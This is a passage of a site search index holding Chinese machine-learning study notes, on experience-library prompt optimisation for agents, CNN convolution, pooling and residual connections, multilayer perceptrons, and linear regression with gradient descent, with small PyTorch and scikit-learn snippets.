<p>\u5c06\u53c2\u6570\u7a7a\u95f4\u66ff\u6362\u4e3a\u4e0a\u4e0b\u6587\uff0c\u5c06\u68af\u5ea6\u66f4\u65b0\u66ff\u6362\u4e3a\u5bf9\u4e8e\u4e00\u4e2a\u81ea\u7136\u8bed\u8a00\u7ecf\u9a8c\u5e93\u8fdb\u884c\u589e\u5220\u67e5\u6539\uff0c\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b</p> <ul> <li>Rollout\u5e76\u4e14\u7528\u5956\u52b1\u6a21\u578b\u8fdb\u884c\u6253\u5206</li> <li>\u7ec4\u5185\u5956\u52b1\u6bd4\u8f83\uff0c\u57fa\u4e8e\u8fd9\u4e9b\u5185\u5bb9\u8fdb\u884cSummary\u968f\u540e\u8f93\u51fa\u53cd\u601d</li> <li>\u57fa\u4e8e\u53cd\u601d\u6765\u66f4\u65b0\u7ecf\u9a8c\u5e93</li> </ul> <p>\u5bf9\u4e8e\u7ecf\u9a8c\u5e93\u53ef\u4ee5\u8fdb\u884c\u589e\u5220\u67e5\u6539</p> <p>\u4e00\u4e2a\u5177\u4f53\u7684\u4f18\u5316\u6d41\u7a0b\u5982\u4e0b\uff0c\u5148\u662f\u6267\u884c\u83b7\u5f97\u8f68\u8ff9\uff0c\u5206\u6790\u8f68\u8ff9\u548cFeedback\uff0c\u53d1\u73b0\u51fa\u73b0\u7684\u95ee\u9898\u6216\u8005\u505a\u7684\u597d\u7684\u70b9\uff0c\u7136\u540e\u63d0\u70bc\u51fa\u89c4\u5219</p> <p></p> <p>\u5176\u4f18\u5316\u7684\u7ed3\u679c\u8282\u9009\u5982\u4e0b</p> <p></p> <p>\u76f8\u6bd4\u4e8e\u4e00\u4e2a\u6587\u7ae0\u5f62\u5f0f\u7684System Prompt\uff0c\u5176\u66f4\u7c7b\u4f3c\u4e8e\u7ef4\u62a4\u4e00\u4e2a\u77e5\u8bc6\u5e93\uff0c\u5bf9\u4e8e\u591a\u8f6e\u7684\u56de\u7b54\u6216\u8005\u591a\u8f6e\u7684Agent\uff0c\u6bd4\u5982Web Search\u7b49\u4efb\u52a1\uff0c\u8fd9\u79cd\u5f62\u5f0f\u6216\u8bb8\u6bd4System prompt\u4f18\u5316\u66f4\u597d\u3002\u5bf9\u4e8eChat-Agent\u7684\u4f18\u5316\u4efb\u52a1\uff0c\u8fd9\u79cd\u65b9\u6848\u53ef\u4ee5\u8986\u76d6\u66f4\u591a\u7684\u8fb9\u754c\u60c5\u51b5\u7684\uff0c\u4e5f\u662f\u7c7b\u4f3c\u4e8e\u5728\u505a\u4e00\u4e2a\u597d\u7684Memory\u673a\u5236</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN/CNN/","title":"CNN","text":"<p>\u4e4b\u524d\u6211\u4eec\u5b66\u4e60\u7684\u795e\u7ecf\u7f51\u7edc\u4e2d\uff0c\u6bcf\u4e2a\u795e\u7ecf\u5143\u90fd\u4ec5\u8868\u793a\u4e00\u4e2a\u6570\u5b57\uff0c\u6211\u4eec\u73b0\u5728\u5e0c\u671b\u6bcf\u4e2a\u795e\u7ecf\u5143\u80fd\u591f\u8868\u793a\u4e00\u4e2a\u77e9\u9635\uff0c\u57fa\u7840\u7684\u591a\u5c42\u7f51\u7edc\uff0c\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u62b9\u6d88\u4e86\u50cf\u7d20\u6570\u636e\u4e4b\u95f4\u7684\u4f4d\u7f6e\u8054\u7cfb\u5173\u7cfb</p> <p>\u540c\u65f6\uff0c\u4fdd\u7559\u4e86\u4f4d\u7f6e\u8054\u7cfb\u4ee5\u5916\uff0cCNN\u8fd8\u80fd\u6709\u6548\u964d\u4f4e\u6240\u8981\u8bad\u7ec3\u7684\u53c2\u6570\u91cf\uff0c\u5728\u5de5\u7a0b\u4e0a\u53ef\u4ee5\u4f7f\u5f97\u795e\u7ecf\u7f51\u7edc\u53d8\u5f97\u66f4\u6df1</p> <p>\u4e0e\u4e00\u822c\u795e\u7ecf\u7f51\u7edc\u5185\u90e8\u4e3b\u8981\u4ee5\u7d2f\u52a0\u4e3a\u4e3b\u4e0d\u540c\uff0cCNN\u5185\u90e8\u533a\u5206\u4e3a\u5377\u79ef\u5c42\u548c\u6c60\u5316\u5c42</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN/CNN/#1","title":"1. \u57fa\u7840\u7ec4\u6210","text":"<p>\u5377\u79ef\u5c42</p> <p>\u200b\u200b</p> <p>\u901a\u8fc7\u4e00\u4e2a\u5377\u79ef\u6838\uff0c\u8fd9\u91cc\u5199\u4f5c\u4e00\u4e2a\u672c\u5730\u611f\u53d7\u91ce\uff0c\u5c06\u8f93\u5165\u5c42\u5904\u7406\u4e00\u904d\uff0c\u5c06\u8f93\u5165\u5c42\u53d6\u51fa\u548c\u5377\u79ef\u6838\u5927\u5c0f\u76f8\u540c\u7684\u4e00\u5757\uff0c\u76f8\u4e58\u518d\u52a0\u548c\uff0c\u751f\u6210\u7ed3\u679c</p> <p>\u8fd9\u79cd\u505a\u6cd5\u4e5f\u5b58\u5728\u4e00\u79cd\u7279\u5f81\u63d0\u53d6\u7684\u6548\u679c\uff0c\u6839\u636e\u7279\u6b8a\u7684\u5377\u79ef\u6838\uff0c\u80fd\u591f\u63d0\u53d6\u56fe\u50cf\u4fe1\u606f\u7684\u4e0d\u540c\u7279\u5f81</p> <p>\u8fd9\u90e8\u5206\u6211\u4eec\u5b9e\u73b0\u7684\u5355\u901a\u9053\uff0c\u4e00\u4e2a\u77e9\u9635\u5230\u4e00\u4e2a\u77e9\u9635\uff0c\u4f46\u662f\u5728\u795e\u7ecf\u7f51\u7edc\u5185\u90e8\u5c42\uff0c\u5e94\u5f53\u662f\u66f4\u52a0\u7c7b\u4f3c\u4e0b\u56fe\u7684\u7ed3\u6784</p> <p>\u200b\u200b</p> <p>\u5377\u79ef\u5c42\u7684\u64cd\u4f5c\u8fd8\u6709\u4e24\u4e2a\u53c2\u6570\uff0c\u5c31\u662f\u6307\u6b65\u5e45\u548c\u586b\u5145</p> <ul> <li>\u6b65\u5e45\u5c31\u662f\u6307\u5377\u79ef\u6838\u7684\u79fb\u52a8\u8de8\u5ea6\uff0c\u4e4b\u524d\u6211\u4eec\u7684\u8ba1\u7b97\u4e2d\uff0c\u5377\u79ef\u6838\u7684\u79fb\u52a8\u6b65\u5e45\u90fd\u662f\u4e00\u683c</li> <li>\u586b\u5145\u5c31\u662f\u6211\u4eec\u53ef\u4ee5\u5728\u8f93\u5165\u7684\u5916\u90e8\u586b\u51450</li> </ul> <p>\u6c60\u5316\u5c42</p> <p>\u5176\u4e3b\u8981\u662f\u7528\u4e8e\u6a21\u62df\u89c6\u89c9\u7684\u6a21\u7cca\u5904\u7406\uff0c\u53ea\u5bf9\u8f93\u5165\u77e9\u9635\u7684\u540e\u4e24\u4e2a\u7ef4\u5ea6\u751f\u6548\uff0c\u6bd4\u5982\u4e0b\u56fe\u4e2d\u5c31\u662f\u505a\u4e86\u53d6\u56db\u4e2a\u503c\u5185\u90e8\u6700\u5927\u503c\u8fd9\u4e48\u4e00\u4e2a\u64cd\u4f5c</p> <p>\u200b\u200b</p> <p>\u6700\u540e\u7684\u7ed3\u6784\u5e94\u5f53\u662f\u5377\u79ef\u5c42 -&gt; \u6fc0\u6d3b\u51fd\u6570 -&gt; \u6c60\u5316\u5c42\u8fd9\u6837\u4e00\u4e2a\u7ed3\u6784</p> <p>\u8fd9\u6837\u7684\u7ed3\u6784\u91cd\u590d\u591a\u6b21\uff0c\u6700\u540e\u52a0\u4e0a\u4e00\u4e2a\u591a\u5c42\u611f\u77e5\u5668\uff0c\u548c\u4e00\u4e2aSoftmax</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN/CNN/#2","title":"2. \u4f18\u5316\u795e\u7ecf\u7f51\u7edc\u4e4b\u6b8b\u5dee\u8fde\u63a5","text":"<p>\u6b8b\u5dee\u8fde\u63a5\u7684\u64cd\u4f5c\u5728\u4e8e\uff0c\u5728\u7ecf\u5386\u4e00\u7cfb\u5217\u7684\u53d8\u6362\u4e4b\u540e\uff0c\u7ed9\u8f93\u51fa\u518d\u52a0\u4e0a\u539f\u59cb\u6570\u636e\uff0c\u539f\u56e0\u5728\u4e8e\uff0c\u6211\u4eec\u7684CNN\u7684\u4e00\u5927\u76ee\u6807\u662f\u53ef\u4ee5\u8ba9\u795e\u7ecf\u7f51\u7edc\u53d8\u6df1\uff0c\u4f46\u7531\u4e8e\u795e\u7ecf\u7f51\u7edc\u53d8\u6df1\u5bfc\u81f4\u7684\u68af\u5ea6\u6d88\u5931\u95ee\u9898\u4ecd\u7136\u6ca1\u6709\u5f7b\u5e95\u7684\u89e3\u51b3\uff0c\u56e0\u6b64\u6211\u4eec\u5f15\u5165\u4e86\u6b8b\u5dee\u8fde\u63a5</p> <p>\u200b\u200b</p> <p>\u4e0a\u8ff0\u8bf4\u6cd5\u662f\u5de5\u7a0b\u89d2\u5ea6\u7684\uff0c\u5728\u7406\u8bba\u89d2\u5ea6\u6765\u8bf4\uff0c\u6b8b\u5dee\u8fde\u63a5\u7684\u5b58\u5728\u4f7f\u5f97\u6a21\u578b\u66f4\u5bb9\u6613\u63a5\u8fd1\u57fa\u51c6\u76ee\u6807\uff0c\u4e5f\u5c31\u662f\u8fd9\u4e2a\u6b8b\u5dee\u5757\u9000\u5316\u6210\u6052\u7b49\u53d8\u6362\u7684\u60c5\u51b5\u3002\u5728\u968f\u673a\u60c5\u5f62 -&gt; \u57fa\u51c6\u76ee\u6807 -&gt; \u6700\u4f18\u76ee\u6807\u4e2d\u52a0\u901f\u4e86\u524d\u534a\u90e8\u5206</p> <p>\u4f46\u662f\u4e0a\u8ff0\u7684\u505a\u6cd5\u91cc\u9762\u5047\u8bbe\u4e86\u5377\u79ef\u53d8\u6362\u4e4b\u540e\u7684\u7ed3\u679c\u548c\u539f\u59cb\u7684\u8f93\u5165x\u662f\u62e5\u6709\u76f8\u540cshape\uff0c\u4f46\u5b9e\u9645\u4e0a\u5e76\u975e\u5982\u6b64\uff0c\u6240\u4ee5\u6211\u4eec\u4e00\u822c\u8981\u7ed9x\u8fd9\u8fb9\u53e6\u5916\u52a0\u4e0a\u4e00\u5c42\u5377\u79ef\u5c42\uff0c\u6216\u8005\u91c7\u7528\u6c60\u5316\u7684\u6280\u672f\u4e5f\u662f\u53ef\u4ee5\u7684\uff0c\u4ee5\u786e\u4fdd\u4e24\u8fb9\u8f93\u51fa\u7684\u7ed3\u679c\u7684shape\u76f8\u540c</p> <p>\u200b\u200b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/%E5%9F%BA%E7%A1%80%E7%9A%84%E5%A4%9A%E5%B1%82%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/%E5%9F%BA%E7%A1%80%E7%9A%84%E5%A4%9A%E5%B1%82%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/","title":"\u57fa\u7840\u7684\u591a\u5c42\u795e\u7ecf\u7f51\u7edc","text":"<p>\u4ee5\u7ebf\u6027\u6a21\u578b\u548c\u975e\u7ebf\u6027\u51fd\u6570\u4e3a\u57fa\u7840\uff0c\u80fd\u591f\u4ea7\u751f\u51fa\u62df\u5408\u6240\u6709\u66f2\u7ebf\u7684\u5355\u5c42\u6a21\u578b\uff0c\u8fd9\u79cd\u5355\u5c42\u6a21\u578b\u7684\u8fde\u63a5\u53ef\u4ee5\u7ec4\u6210\u57fa\u7840\u7684\u795e\u7ecf\u7f51\u7edc\uff0c\u6211\u4eec\u6709\u65f6\u5019\u4e5f\u628a\u8fd9\u79cd\u7ed3\u6784\u53eb\u505a\u591a\u5c42\u611f\u77e5\u5668</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/%E5%9F%BA%E7%A1%80%E7%9A%84%E5%A4%9A%E5%B1%82%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/%E5%9F%BA%E7%A1%80%E7%9A%84%E5%A4%9A%E5%B1%82%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/#1","title":"1. \u5982\u4f55\u4ee5\u5355\u5c42\u6a21\u578b\u62df\u5408\u6240\u6709\u66f2\u7ebf","text":"<p>\u672c\u90e8\u5206\u6765\u81ea \u674e\u5b8f\u6bc5\u673a\u5668\u5b66\u4e60\u8bfe\u7a0b</p> <p>\u4ece\u7ebf\u6027\u76f4\u7ebf\uff0c\u8f6c\u5411\u4efb\u610f\u7684\u66f2\u7ebf\uff0c\u7528\u6298\u7ebf\u903c\u8fd1\u66f2\u7ebf\uff0c\u5982\u4e0b\u56fe\uff0c\u7eff\u8272\u7684\u66f2\u7ebf\u53ef\u80fd\u662f\u6211\u4eec\u73b0\u5b9e\u751f\u6d3b\u4e2d\u771f\u6b63\u7684\u60c5\u5f62\uff0c\u7136\u540e\u6211\u4eec\u6211\u4eec\u53ef\u4ee5\u7528\u6298\u7ebf\u53bb\u903c\u8fd1\u8fd9\u6837\u4e00\u79cd\u771f\u662f\u7684\u60c5\u5f62\uff0c\u5c31\u662f\u4e8c\u56fe\u4e2d\u7684\u7ea2\u8272\u66f2\u7ebf\uff0c\u7136\u540e\u6211\u4eec\u53d1\u73b0\u7ea2\u8272\u66f2\u7ebf\u53ef\u4ee5\u7528\u4e00\u5806\u7684\u84dd\u8272\u6298\u7ebf\u53bb\u5408\u6210\uff0c\u8fd9\u79cd\u84dd\u6298\u7ebf\u7684\u7279\u70b9\u5c31\u5728\u4e8e\u662f\u5e38\u6570-\u76f4\u7ebf-\u5e38\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u5728\u6570\u5b66\u4e0a\u53ef\u4ee5\u7528Sigmoid Function\uff0c\u4e5f\u5c31\u662f\u4e09\u56fe\u4e2d\u7684\u66f2\u7ebf\u6765\u903c\u8fd1\u8fd9\u6837\u7684\u84dd\u6298\u7ebf</p> <p>\u200b\u200b\u200b\u200b</p> <p>\u8fd9\u79cd\u84dd\u8272\u7684\u6298\u7ebf\uff0c\u6211\u4eec\u5c06\u5176\u79f0\u4e3aHard Sigmoid\uff0c\u9700\u8981\u7684Hard Sigmoid\u7684\u6570\u91cf\u4e0e\u7ea2\u8272\u6298\u7ebf\u7684\u6bb5\u6570\u76f8\u5173</p> <p>\u200b\u200b</p> <p>\u8fd9\u4e2a\u590d\u6742\u7684\u5f0f\u5b50\uff0c\u7ecf\u8fc7\u7ebf\u6027\u4ee3\u6570\u7684\u89c6\u89d2\uff0c\u5176\u5b9e\u5c31\u662f\u4ee5\u4e0b\u4e09\u4e2a\u6b65\u9aa4</p> <ul> <li>\\(r = b+Wx\\)  W \u662f\u6240\u6709 Wij \u5f62\u6210\u7684\u77e9\u9635</li> <li>\\(a = \\sigma(r)\\)        \u662f\u6307sigmoid\u51fd\u6570</li> <li>\\(y = b+c^Ta\\)  \u6700\u7ec8\u6210\u578b</li> </ul> \\[ y=b+c^T\\ \\sigma(b+Wx) \\] <p>sigmoid\u7684\u6570\u91cf\u8d8a\u591a\uff0c\u5f62\u6210\u7684\u51fd\u6570\u7ed3\u679c\u8d8a\u590d\u6742\uff0c\u903c\u8fd1\u6548\u679c\u8d8a\u597d\uff0csigmoid\u7684\u6570\u91cf\u548cfeature\u7684\u6570\u91cf\u65e0\u5173</p> <p>\u200b\u200b</p> <p>\u4e0a\u8ff0\u7684\u5f0f\u5b50\uff0c\u5176\u5b9e\u5c31\u662f\u795e\u7ecf\u7f51\u7edc\u4e2d\u7684\u4e00\u5c42\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u4e00\u5c42\u7684\u795e\u7ecf\u7f51\u7edc\u5df2\u7ecf\u80fd\u591f\u903c\u8fd1\u4efb\u610f\u7684\u590d\u6742\u51fd\u6570\uff0c\u8fd9\u91cc\u7559\u4e0b\u4e86\u4e00\u4e2a\u7591\u95ee\uff0c\u5e76\u4e14\u540c\u65f6\uff0c\u66f4\u6df1\u7684\u795e\u7ecf\u7f51\u7edc\u5c42\u6570\u8fd8\u4f1a\u5bfc\u81f4\u8fc7\u62df\u5408\u7b49\u95ee\u9898</p> <p>\u5982\u4e0a\u56fe\u662f\u4e00\u5c42\u795e\u7ecf\u7f51\u7edc\uff0c\u91cc\u9762\u6709i\u4e2a\u795e\u7ecf\u5143\uff0csigmoid\u51fd\u6570\u7684\u6570\u91cf\u5c31\u662f\u795e\u7ecf\u5143\u7684\u6570\u91cf</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/%E5%9F%BA%E7%A1%80%E7%9A%84%E5%A4%9A%E5%B1%82%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/%E5%9F%BA%E7%A1%80%E7%9A%84%E5%A4%9A%E5%B1%82%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/#2","title":"2. \u624b\u5199\u5e38\u89c4\u795e\u7ecf\u7f51\u7edc\u6a21\u578b","text":"<p>\u8fd9\u79cd\u6700\u7ec8\u4ee5\u975e\u7ebf\u6027\u51fd\u6570\u5f62\u5f0f\u8fd4\u56de\u7684\u51fd\u6570\uff0c\u88ab\u79f0\u4e3a\u903b\u8f91\u56de\u5f52\uff0c\u795e\u7ecf\u7f51\u7edc\u7684\u6700\u540e\u5e38\u5e38\u4f7f\u7528softmax\u51fd\u6570\u4f5c\u4e3a\u6700\u540e\u7684\u7ed3\u679c\u7684\u5904\u7406</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/%E5%9F%BA%E7%A1%80%E7%9A%84%E5%A4%9A%E5%B1%82%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/%E5%9F%BA%E7%A1%80%E7%9A%84%E5%A4%9A%E5%B1%82%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/#3","title":"3. \u795e\u7ecf\u7f51\u7edc\u7684\u4f18\u5316","text":"<pre><code>self.block = nn.Sequential(\n       nn.Linear(input_dim, output_dim),\n       nn.ReLU(),\n)\n</code></pre> <p>Pytorch\u4e3a\u6211\u4eec\u5c01\u88c5\u597d\u7684\u795e\u7ecf\u7f51\u7edc\u5982\u4e0a\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u5c42\u6211\u4eec\u53ea\u9700\u8981\u8bbe\u7f6e\u8f93\u5165\u8f93\u51fa\u7684\u7ef4\u5ea6\u548c\u4f7f\u7528\u7684\u6a21\u578b\uff0c\u4ee5\u53ca\u76f8\u5e94\u7684\u6fc0\u6d3b\u51fd\u6570\u5c31\u53ef\u4ee5\u642d\u5efa\u51fa\u4e00\u4e2a\u6bd4\u8f83\u7b80\u5355\u7684\u795e\u7ecf\u7f51\u7edc</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/%E5%9F%BA%E7%A1%80%E7%9A%84%E5%A4%9A%E5%B1%82%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/%E5%9F%BA%E7%A1%80%E7%9A%84%E5%A4%9A%E5%B1%82%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/#4","title":"4. \u5e94\u7528\u4e4b\u5206\u7c7b\u62df\u5408","text":"<p>\u795e\u7ecf\u7f51\u7edc\u7684\u4f18\u5316\u539f\u7406\uff0c\u4f8b\u5982\u5bf9\u4e8e\u56fe\u50cf\u5206\u7c7b\u800c\u8a00\uff0c\u4e00\u5806\u7684\u70b9\u6563\u843d\u5728\u4e8c\u7ef4\uff08\u59d1\u4e14\u5047\u8bbe\u662f\u4e8c\u7ef4\uff09\u5e73\u9762\u4e0a\uff0c\u6211\u4eec\u96be\u4ee5\u505a\u5230\u7528\u4e00\u6761\u76f4\u7ebf\u53bb\u5207\u5272\u5b8c\u6210\u5206\u7c7b\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u5347\u7ef4\uff0c\u5c06\u5176\u8f6c\u6362\u6210\u591a\u7ef4\u7a7a\u95f4\uff0c\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u7528\u4e00\u4e2a\u8d85\u5e73\u9762\u505a\u66f4\u597d\u7684\u5207\u5272\u5206\u7c7b</p> <p>\u540c\u65f6\uff0c\u6211\u4eec\u4e4b\u524d\u63d0\u5230\u4e86\uff0c\u7406\u8bba\u4e0a\u4e00\u5c42\u7684\u795e\u7ecf\u7f51\u7edc\u8db3\u4ee5\u62df\u5408\u6240\u6709\u60c5\u5f62\uff0c\u4f46\u662f\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u591a\u5c42\u7684\u795e\u7ecf\u7f51\u7edc\uff0c\u539f\u56e0\u5728\u4e8e\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u964d\u7ef4\u5ea6\u7684\u65b9\u5f0f\u5bf9\u5176\u8fdb\u884c\u62bd\u8c61\uff0c\u6bd4\u5982\u6211\u4eec\u5c06\u50cf\u7d20\u8f6c\u6362\u6210\u4e86\u8fd9\u51e0\u4e2a\u52a8\u4f5c\uff0c\u5c31\u662f\u964d\u7ef4\uff0c\u56e0\u6b64\u5982\u679c\u7528\u4e8e\u5224\u65ad\u4e00\u4e2a\u4eba\u7684\u5fc3\u7406\u72b6\u6001\uff0c\u5e76\u975e\u6240\u6709\u4fe1\u606f\u90fd\u662f\u6709\u610f\u4e49\u7684\uff0c\u6bd4\u5982\u6bdb\u53d1\u7684\u7a00\u758f\uff0c\u53ef\u80fd\u5c31\u548c\u5fc3\u7406\u72b6\u6001\u65e0\u610f\u4e49\uff0c\u591a\u5c42\u7684\u795e\u7ecf\u7f51\u7edc\u4f1a\u4e0d\u65ad\u5730\u62bd\u8c61\u51fa\u4e0e\u6211\u4eec\u7684\u76ee\u6807\u66f4\u76f8\u5173\u7684\u4fe1\u606f</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u8f93\u5165\u4e00\u4e2a\u5411\u91cf\uff0c\u6700\u540e\u8f93\u51fa\u4e00\u4e2a</p> <ul> <li>\u6570\u503c Regression</li> <li>\u7c7b\u522b Classification</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/","title":"\u7ebf\u6027\u56de\u5f52","text":"<p>\u7ebf\u6027\u56de\u5f52\u7684\u672c\u8d28\u5c31\u662f\u7ed9\u5b9a\u4e00\u5806\u6570\u636e\uff0c\u6211\u4eec\u62df\u5408\u51fa\u4e00\u4e2a\u7ebf\u6027\u7684\u51fd\u6570\u51fa\u6765\uff0c\u57fa\u7840\u7684\u7ebf\u6027\u56de\u5f52\u7684\u4ee3\u7801\uff0c\u7b2c\u4e09\u65b9\u5e93\u5df2\u7ecf\u5e2e\u6211\u4eec\u5c01\u88c5\u597d\u4e86</p> <pre><code>from sklearn import linear_model\nm = linear_model.LinearRegression()\nm.fit(x.view(-1, 1), y)  #\u5c01\u88c5\u597d\u7684\u7ebf\u6027\u62df\u5408\uff0cx\u548cy\u53d8\u91cf\u5c31\u662f\u5bf9\u5e94\u7684\u6570\u636e\nm.coef_, m.intercept_    #\u62df\u5408\u51fa\u6765\u7684\u7ebf\u6027\u8868\u8fbe\u5f0f\u7684\u53c2\u6570\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/#1","title":"1. \u4e00\u4e2a\u4f8b\u5b50","text":"<p>\u8fd9\u4e2a\u4f8b\u5b50\u6765\u81ea\u4e8e\u674e\u5b8f\u6bc5\u8001\u5e08\u7684\u673a\u5668\u5b66\u4e60\u8bfe\u7a0b</p> <p>\u627e\u5230(\u731c\u6d4b)\u4e00\u4e2a\u5f0f\u5b50</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u95ee\u9898\u6211\u4eec\u60f3\u8981\u7528\u673a\u5668\u5b66\u4e60\u7684\u65b9\u6cd5\u6765\u89e3\u51b3\uff0c\u9996\u5148\u6211\u4eec\u9700\u8981\u6709\u4e00\u4e2a\u5e26\u6709\u672a\u77e5\u53c2\u6570\u7684\u5f0f\u5b50\u3002\u4f8b\u5982\u6211\u4eec\u8981\u9884\u6d4b\u9891\u9053\u7b2c\u4e8c\u5929\u7684\u70b9\u9605\u6570\u91cf\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u8fd9\u4e48\u505a</p> <p>\u200b\u200b</p> <p>\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u8fd9\u4e2a\u51fd\u6570\u5f0f\u5b50\u5f20\u8fd9\u4e2a\u6837\u5b50\uff0c\u53ea\u80fd\u8bf4\u662f\u76ee\u524d\u6839\u636e\u5df2\u6709\u7684\u7ecf\u9a8c\u731c\u6d4b\u7684\uff0c\u8fd9\u4e2a\\(y = f(x)\\) \u7684\u5f0f\u5b50\uff0c\u5c31\u79f0\u4e3a\u4e00\u4e2aModel</p> <ul> <li>Feature\uff0c\u662f\u6307\u50cf\\(x_1\\)\u4e00\u6837\u6211\u4eec\u8f93\u5165\u7684\u53c2\u6570</li> <li>w \u662f weight, b \u662f bias \u5c5e\u4e8e\u662f\u7ea6\u5b9a\u4fd7\u6210\u7684\u540d\u79f0\u4e86</li> </ul> <p>Loss Function for Train data</p> \\[ Loss = L(w, b) \\] <p>Loss function\u6c38\u8fdc\u662f\u9488\u5bf9\u4e00\u4e2a\u8bad\u7ec3\u96c6\u800c\u8a00\u7684\uff0c\u6bd4\u5982\u6211\u4eec\u5148\u5047\u8bbe\uff0c\u8fd9\u91cc\u7684\\(y=f(x) = x+0.5k\\)(\u8fd9\u91cc\u7684k\u662f\u5343\u7684\u610f\u601d)</p> <p>\u200b\u200b</p> <p>label\u662f\u6307\u5f53\u5929\u51c6\u786e\u7684\u6570\u636e\uff0c\u6211\u4eec\u6bcf\u6b21\u90fd\u8ba1\u7b97\u9884\u6d4b\u6570\u636e\u548c\u51c6\u786e\u6570\u636e\u4e4b\u95f4\u7684\u5dee\u8ddd\uff08\u6ce8\u610f\u8fd9\u4e2a\u5dee\u8ddd\u4e0d\u4e00\u5b9a\u662f\u7b80\u5355\u7684\u76f8\u51cf\uff09\uff0c\u6211\u4eec\u628a\u8fd9\u4e09\u5e74\u65f6\u95f4\u83b7\u5f97\u7684\\(e_n\\)\u52a0\u8d77\u6765\u6c42\u548c</p> \\[ loss = \\frac1N*\\sum_{i=1}^{N}e_i \\] <p>\u6211\u4eec\u524d\u6587\u4e2d\u63d0\u5230\u8fd9\u4e2a\u5dee\u8ddd\u4e0d\u4e00\u5b9a\u662f\u7b80\u5355\u7684\u76f8\u51cf</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5730\u7a77\u4e3ew\u548cb\u7684\u503c\u4ece\u800c\u83b7\u5f97\u4e00\u5f20\u56fe\uff0c\u91cc\u9762\u8d8a\u662f\u7ea2\u8272\u7cfb\u7684\u8868\u793aloss\u8d8a\u5927</p> <p>\u200b\u200b</p> <p>Optimization</p> <p>\u8fd9\u91cc\u53ea\u4ecb\u7ecd\u6700\u57fa\u7840\u4e5f\u6700\u5e38\u7528\u7684\u4f18\u5316\u7b56\u7565\uff0c\u4e5f\u5c31\u662f\u68af\u5ea6\u4e0b\u964dGradient Desecent\uff0c\u672c\u8d28\u4e0a\u5c31\u662f\u5bf9\u77e9\u9635\u6c42\u5bfc\uff0c\u627e\u5207\u5411\u91cf\uff0c\u6bd4\u5982\u5728\u4e00\u7ef4\u7684\u60c5\u51b5\u4e0b\u5c31\u662f\u627e\u5207\u7ebf</p> <p>\u200b\u200b</p> <p>\u5177\u4f53\u8981\u5f80\u68af\u5ea6\u4e0b\u964d\u7684\u5730\u65b9\u79fb\u52a8\u591a\u5c11\u957f\u5ea6\uff0c\u8fd9\u5c31\u53d6\u51b3\u4e8e\u4e00\u4e2a\u8d85\u53c2\u6570\uff0c\u4e5f\u5c31\u662f\u4e0a\u9762\u7684\u88ab\u79f0\u4e3alearning rate\u7684\u4e1c\u897f</p> 